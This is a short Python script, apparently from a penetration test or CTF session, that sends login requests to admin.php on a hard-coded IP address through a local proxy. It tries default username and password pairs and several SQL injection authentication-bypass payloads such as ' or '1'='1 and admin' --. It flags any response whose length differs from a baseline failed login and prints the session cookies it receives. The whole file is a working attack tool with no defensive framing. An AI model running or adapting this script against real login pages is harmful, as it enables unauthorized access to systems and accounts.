import urllib.request, urllib.parse, urllib.error
BASE = "http://160.202.254.160:15880/"
PROXY = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
op = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))

def login(user, pwd):
    data = urllib.parse.urlencode({"username": user, "password": pwd, "submit": "login"}).encode()
    try:
        with op.open(BASE + "admin.php", data=data, timeout=20) as r:
            b = r.read().decode("utf-8", "replace")
            return r.status, b, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return "ERR", "%s: %s" % (type(e).__name__, e), {}

base = login("x", "y")[1]
print("基线响应长度:", len(base))

cases = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("root", "root"),
    ("administrator", "admin"),
    ("admin' or '1'='1", "x"),
    ("admin' -- ", "x"),
    ("admin'#", "x"),
    ("' or 1=1#", "x"),
    ("admin' or 1=1 limit 1#", "x"),
    ("' or '1'='1' #", "x"),
]
for u, p in cases:
    st, b, hd = login(u, p)
    diff = "" if len(b) == len(base) else "  <<< 长度变化"
    print("%-24s / %-10s -> %s len=%s%s" % (u, p, st, len(b), diff))
    if len(b) != len(base):
        print("    body:", b[:300].replace("\n", " "))
    sc = hd.get("Set-Cookie")
    if sc:
        print("    set-cookie:", sc)
